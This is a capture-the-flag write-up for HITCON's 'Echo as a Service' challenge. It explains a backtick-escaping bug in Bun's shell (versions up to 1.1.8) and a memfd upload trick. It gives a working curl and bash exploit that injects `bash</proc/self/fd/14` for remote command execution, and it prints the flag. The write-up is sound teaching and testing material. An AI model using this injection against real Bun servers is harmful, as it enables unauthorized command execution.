# Echo as a Service

* Category: Web
* Score: 238/500
* Solves: 38/942
* First blood: Friendly Maltese Citizens

## Description

Execute `/readflag give me the flag` to get the flag.

## Overview

The challenge is a simple Bun HTTP server that uses Bun's [$ Shell](https://bun.sh/docs/runtime/shell) to execute the `echo` command:

```javascript
import { $ } from "bun";
// [...]
const output = await $`echo ${msg}`.text();
```

The target Bun version is `1.1.8`.

> This challenge is inspired by `Boom Boom Hell` in LINE CTF 2024.

## Solution

### Intended Solution

Although Bun claims it will escape all strings by default to prevent shell injection attacks, in Bun version `<=1.1.8`, it fails to escape the `` ` ``.

> Bun starts escaping the backtick after this update: https://github.com/oven-sh/bun/pull/10980
>
> By the way, I didn't expect this bug need to be found by reading the source code, some simple fuzzing should be enough. (This is how I found this bug while playing LINE CTF 2024 too :p)

Therefore, we can use `` `sh</path/to/file` `` to execute arbitrary commands if there is a file with user-controlled content.

When Bun receives a request with a large file, similar to the [well known LFI tricks involving nginx buffering](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/), it will create a `memfd` to store the file content. We can leverage this to create a file with arbitrary content and access it via `/proc/self/fd/<number>`.

> Again, reading the source code isn't necessary to uncover this behavior. Something like `strace -yy -e fd=all` or any way to monitor the `/proc/<bun-pid>/fd` can help you find this behavior easily.

The final exploit is:

```bash
#!/bin/bash

target="http://eaas.chal.hitconctf.com:30002/echo"

python3 -c 'print("/readflag give me the flag\n"+"a"*1024*1024*10)' > /tmp/qqq

curl "$target" -F 'msg=`bash</proc/self/fd/14`' -F 'file=@/tmp/qqq'
```

You should get the flag in the response.

flag: `hitcon{i_found_this_bug_during_LINECTF_but_unfortunately_it_became_1day_challenge_a_few_months_ago}`

### Unintended Solution

The unintended solution can be found in this [well-made write-up](https://github.com/nullchilly/ctf/blob/main/hitcon24/echo_as_a_service/README.md) by [@nullchilly](https://github.com/nullchilly)

## Credit

Thanks again to [@maple3142](https://github.com/maple3142) for giving me ideas about using Bun temporary file while playtesting this challenge.